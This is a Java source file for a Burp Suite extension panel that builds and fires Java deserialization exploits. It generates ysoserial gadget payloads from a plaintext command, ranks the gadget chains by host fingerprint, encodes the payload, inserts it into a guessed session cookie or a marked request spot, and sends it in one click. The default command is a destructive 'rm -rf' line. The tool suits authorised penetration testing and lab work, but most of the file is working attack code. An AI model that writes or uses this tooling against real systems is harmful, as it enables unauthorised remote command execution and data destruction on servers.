package burp.ui;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;
import burp.core.Encoder;
import burp.core.GadgetCatalog;
import burp.core.Settings;
import burp.core.YsoserialEngine;
import burp.model.HostIntel;

import javax.swing.*;
import java.awt.*;
import java.util.Comparator;
import java.util.List;

/**
 * The core exploitation workflow in one screen:
 *
 * <pre>
 *   plaintext command  ->  pick gadget (recommended first)  ->  encode  ->  insert into cookie
 *                       ->  send  ->  read response
 * </pre>
 *
 * A request is loaded here from the Proxy/Repeater right-click menu (see the extension's
 * context-menu provider) or pasted directly. The gadget dropdown is ordered by the
 * recommender using everything the passive scanner and previous probes learned about the host.
 */
public final class PayloadBuilderPanel extends JPanel {

    private final MontoyaApi api;
    private final YsoserialEngine yso;
    private final Settings settings;

    private final HttpRequestEditor requestEditor;
    private final HttpResponseEditor responseEditor;

    private final JComboBox<String> gadgetCombo = new JComboBox<>();
    private final JComboBox<Encoder> encodingCombo = new JComboBox<>(Encoder.values());
    private static final String INS_MARKER = "{PAYLOAD} marker";
    private static final String INS_COOKIE = "Cookie (auto)";
    private final JComboBox<String> insertModeCombo =
            new JComboBox<>(new String[]{INS_MARKER, INS_COOKIE});
    private final JTextField cookieNameField = new JTextField("session", 8);
    private final JTextField commandField = new JTextField("rm -rf /home/carlos/test.txt");
    private final JTextArea payloadPreview = new JTextArea(3, 40);
    private final JLabel recommendation = new JLabel(" ");
    private final JLabel statusLabel = new JLabel(" ");

    public PayloadBuilderPanel(MontoyaApi api, YsoserialEngine yso, Settings settings) {
        super(new BorderLayout(8, 8));
        this.api = api;
        this.yso = yso;
        this.settings = settings;

        this.requestEditor = api.userInterface().createHttpRequestEditor();
        this.responseEditor = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);

        // Cookies carry text, not raw bytes: default to URL-safe Base64 so the serialized object
        // survives the HTTP header intact (RAW would corrupt high bytes when stringified).
        encodingCombo.setSelectedItem(Encoder.URL_BASE64);

        setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));
        add(buildControls(), BorderLayout.NORTH);
        add(buildEditors(), BorderLayout.CENTER);
        add(buildStatusBar(), BorderLayout.SOUTH);

        refreshGadgets();
    }

    // ------------------------------------------------------------------ layout

    private JComponent buildControls() {
        JPanel p = new JPanel(new GridBagLayout());
        GridBagConstraints c = new GridBagConstraints();
        c.insets = new Insets(3, 4, 3, 4);
        c.anchor = GridBagConstraints.WEST;
        c.fill = GridBagConstraints.HORIZONTAL;

        int row = 0;
        // Row: command
        c.gridx = 0; c.gridy = row; c.weightx = 0;
        p.add(new JLabel("Command (plaintext):"), c);
        c.gridx = 1; c.gridwidth = 3; c.weightx = 1;
        p.add(commandField, c);
        c.gridwidth = 1;

        // Row: gadget | encoding | insert-mode | cookie  (compact, in parallel)
        row++;
        c.gridx = 0; c.gridy = row; c.weightx = 0;
        p.add(new JLabel("Gadget:"), c);
        c.gridx = 1; c.weightx = 1;
        p.add(gadgetCombo, c);
        c.gridx = 2; c.weightx = 0;
        p.add(new JLabel("Encoding:"), c);
        c.gridx = 3; c.weightx = 0;
        p.add(encodingCombo, c);
        c.gridx = 4; c.weightx = 0;
        p.add(new JLabel("Insert into:"), c);
        c.gridx = 5; c.weightx = 0;
        p.add(insertModeCombo, c);
        c.gridx = 6; c.weightx = 0;
        p.add(cookieNameField, c);   // only used in Cookie mode

        // Row: buttons + recommendation
        row++;
        JButton markSel  = new JButton("Mark selection");
        JButton generate = new JButton("Generate");
        JButton insert   = new JButton("Insert");
        JButton send     = new JButton("Send");
        JButton genInsertSend = new JButton("Generate + Insert + Send");
        JButton reload   = new JButton("Reload ysoserial");

        markSel.setToolTipText("Replace the currently selected bytes in the request with a "
                + RequestInserter.MARKER + " marker. The payload will overwrite exactly that spot.");
        markSel.addActionListener(e -> onMarkSelection());
        generate.addActionListener(e -> onGenerate());
        insert.addActionListener(e -> onInsert(currentEncodedPayload()));
        send.addActionListener(e -> onSend());
        genInsertSend.addActionListener(e -> onOneShot());
        reload.addActionListener(e -> { yso.reload(); refreshGadgets(); });
        gadgetCombo.addActionListener(e -> updateRecommendationLabel());
        insertModeCombo.addActionListener(e ->
                cookieNameField.setVisible(INS_COOKIE.equals(insertModeCombo.getSelectedItem())));
        cookieNameField.setVisible(false);

        JPanel buttons = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        buttons.add(markSel); buttons.add(generate); buttons.add(insert); buttons.add(send);
        buttons.add(genInsertSend); buttons.add(reload);
        c.gridx = 0; c.gridy = row; c.gridwidth = 5; c.weightx = 0;
        p.add(buttons, c);
        c.gridx = 5; c.gridwidth = 2; c.weightx = 1;
        recommendation.setForeground(new Color(0x1a7f37));
        p.add(recommendation, c);
        c.gridwidth = 1;

        return p;
    }

    private JComponent buildEditors() {
        payloadPreview.setEditable(false);
        payloadPreview.setLineWrap(true);
        payloadPreview.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));
        JScrollPane preview = new JScrollPane(payloadPreview);
        preview.setBorder(BorderFactory.createTitledBorder(
                "Encoded payload preview  —  or type " + RequestInserter.MARKER
                + " / select bytes in the request to mark the insertion point"));

        JSplitPane editors = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                titled(requestEditor.uiComponent(), "Request (editable — paste or send from Proxy/Repeater)"),
                titled(responseEditor.uiComponent(), "Response"));
        editors.setResizeWeight(0.5);

        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, preview, editors);
        split.setResizeWeight(0.18);   // small preview, large editors
        return split;
    }

    private JComponent buildStatusBar() {
        JPanel bar = new JPanel(new BorderLayout());
        bar.add(statusLabel, BorderLayout.WEST);
        return bar;
    }

    private static JComponent titled(Component comp, String title) {
        JPanel wrap = new JPanel(new BorderLayout());
        wrap.setBorder(BorderFactory.createTitledBorder(title));
        wrap.add(comp, BorderLayout.CENTER);
        return wrap;
    }

    // ------------------------------------------------------------------ actions

    /** Load a request captured elsewhere (context menu). Also seeds the recommender. */
    public void loadRequest(HttpRequestResponse rr) {
        if (rr == null || rr.request() == null) return;
        requestEditor.setRequest(rr.request());
        if (rr.response() != null) responseEditor.setResponse(rr.response());
        // Try to guess the interesting cookie name from the request.
        String guessed = guessCookieName(rr.request());
        if (guessed != null) cookieNameField.setText(guessed);
        refreshGadgets();
        status("Loaded request for " + hostOf(), false);
    }

    private void onGenerate() {
        String enc = currentEncodedPayload();
        if (enc != null) {
            payloadPreview.setText(enc);
            status("Payload generated (" + selectedGadget() + ", " + selectedEncoding().label() + ")", false);
        }
    }

    private boolean onInsert(String encoded) {
        if (encoded == null) return false;
        HttpRequest req = requestEditor.getRequest();
        if (req == null) { status("No request loaded.", true); return false; }

        // Guard: a payload with CR/LF/NUL would break headers or truncate the request.
        if (!RequestInserter.isTransportSafe(encoded)) {
            status("Payload has raw line breaks/NUL — switch to a URL-safe encoding "
                    + "(Base64 / Base64 URL) before inserting into the request.", true);
            return false;
        }

        String mode = (String) insertModeCombo.getSelectedItem();
        HttpRequest updated;
        String where;
        if (INS_COOKIE.equals(mode)) {
            String cookie = cookieNameField.getText().trim();
            if (cookie.isEmpty()) { status("Enter a cookie name for Cookie mode.", true); return false; }
            updated = CookieRewriter.setCookie(req, cookie, encoded);
            where = "cookie '" + cookie + "'";
        } else { // {PAYLOAD} marker
            updated = RequestInserter.replaceMarker(req, encoded);
            if (updated == null) {
                status("No " + RequestInserter.MARKER + " marker — select the bytes to target and "
                        + "click 'Mark selection' first.", true);
                return false;
            }
            where = RequestInserter.MARKER + " marker";
        }
        requestEditor.setRequest(updated);
        status("Inserted payload at " + where + ".", false);
        return true;
    }

    /** Turn the current editor selection into a {@code {PAYLOAD}} marker (overwrites it on insert). */
    private void onMarkSelection() {
        HttpRequest marked = RequestInserter.markSelection(requestEditor);
        if (marked == null) { status("Select some bytes in the request first.", true); return; }
        requestEditor.setRequest(marked);
        insertModeCombo.setSelectedItem(INS_MARKER);
        status("Insert point set: selection replaced with " + RequestInserter.MARKER
                + ". Now Generate + Insert to overwrite it.", false);
    }

    /**
     * Preload this panel as an exploit from a Scanner hit: request + confirmed gadget + encoding +
     * insertion mode, ready to fire.
     */
    public void loadExploit(HttpRequest base, String gadget, Encoder enc, boolean cookieMode, String cookieName) {
        if (base != null) requestEditor.setRequest(base);
        refreshGadgets();
        if (gadget != null) gadgetCombo.setSelectedItem(gadget);
        if (enc != null) encodingCombo.setSelectedItem(enc);
        insertModeCombo.setSelectedItem(cookieMode ? INS_COOKIE : INS_MARKER);
        if (cookieMode && cookieName != null && !cookieName.isBlank()) cookieNameField.setText(cookieName);
        updateRecommendationLabel();
        onGenerate();
        status("Loaded exploit: " + gadget + " (" + (enc == null ? "" : enc.label()) + ")", false);
    }

    private void onSend() {
        HttpRequest req = requestEditor.getRequest();
        if (req == null) { status("No request to send.", true); return; }
        status("Sending…", false);
        new SwingWorker<HttpRequestResponse, Void>() {
            @Override protected HttpRequestResponse doInBackground() { return api.http().sendRequest(req); }
            @Override protected void done() {
                try {
                    HttpRequestResponse rr = get();
                    if (rr.response() != null) {
                        responseEditor.setResponse(rr.response());
                        status("Response: HTTP " + rr.response().statusCode()
                                + " (" + rr.response().toByteArray().length() + " bytes)", false);
                    } else {
                        status("No response received.", true);
                    }
                } catch (Exception e) {
                    status("Send failed: " + e.getMessage(), true);
                }
            }
        }.execute();
    }

    private void onOneShot() {
        String enc = currentEncodedPayload();
        if (enc == null) return;
        payloadPreview.setText(enc);
        if (onInsert(enc)) onSend();   // only send if the payload was actually placed
    }

    // ------------------------------------------------------------------ helpers

    private String currentEncodedPayload() {
        if (!yso.isReady() && !yso.reload()) {
            status("ysoserial not loaded: " + yso.lastError(), true);
            return null;
        }
        try {
            byte[] raw = yso.generate(selectedGadget(), commandField.getText());
            return selectedEncoding().encode(raw);
        } catch (Exception e) {
            status("Payload generation failed: " + YsoserialEngine.describe(e), true);
            return null;
        }
    }

    /** Rebuild the gadget list, ordered by the recommender for the current host. */
    public void refreshGadgets() {
        List<String> names = yso.availableGadgetNames();
        if (names.isEmpty()) {
            gadgetCombo.setModel(new DefaultComboBoxModel<>(new String[]{"(load ysoserial in Settings)"}));
            gadgetCombo.setEnabled(false);
            updateRecommendationLabel();
            return;
        }
        gadgetCombo.setEnabled(true);
        String host = hostOf();
        List<String> ordered = names.stream()
                .sorted(Comparator.comparingInt((String n) -> HostIntel.get().scoreFor(host, GadgetCatalog.metadata(n)))
                        .reversed()
                        .thenComparing(Comparator.naturalOrder()))
                .toList();
        String prev = (String) gadgetCombo.getSelectedItem();
        gadgetCombo.setModel(new DefaultComboBoxModel<>(ordered.toArray(new String[0])));
        if (prev != null && ordered.contains(prev)) gadgetCombo.setSelectedItem(prev);
        updateRecommendationLabel();
    }

    private void updateRecommendationLabel() {
        String host = hostOf();
        String g = selectedGadget();
        if (g == null) { recommendation.setText(" "); return; }
        int score = HostIntel.get().scoreFor(host, GadgetCatalog.metadata(g));
        if (score >= 100)      recommendation.setText("★ Confirmed on this host");
        else if (score >= 10)  recommendation.setText("★ Recommended (fingerprint match)");
        else                   recommendation.setText(" ");
    }

    private String selectedGadget() {
        Object o = gadgetCombo.getSelectedItem();
        return o == null ? null : o.toString();
    }

    private Encoder selectedEncoding() {
        Encoder e = (Encoder) encodingCombo.getSelectedItem();
        return e == null ? Encoder.BASE64 : e;
    }

    private String hostOf() {
        try {
            HttpRequest req = requestEditor.getRequest();
            return req == null ? "" : req.httpService().host();
        } catch (Exception e) { return ""; }
    }

    private static String guessCookieName(HttpRequest req) {
        try {
            return req.headers().stream()
                    .filter(h -> h.name().equalsIgnoreCase("Cookie"))
                    .flatMap(h -> java.util.Arrays.stream(h.value().split(";")))
                    .map(String::trim)
                    .filter(s -> s.contains("="))
                    .map(s -> s.substring(0, s.indexOf('=')).trim())
                    .filter(n -> n.toLowerCase().matches(".*(session|sess|auth|token|sid|id).*"))
                    .findFirst().orElse(null);
        } catch (Exception e) { return null; }
    }

    private void status(String msg, boolean error) {
        SwingUtilities.invokeLater(() -> {
            statusLabel.setForeground(error ? Color.RED.darker() : new Color(0x1a7f37));
            statusLabel.setText(" " + msg);
        });
    }
}
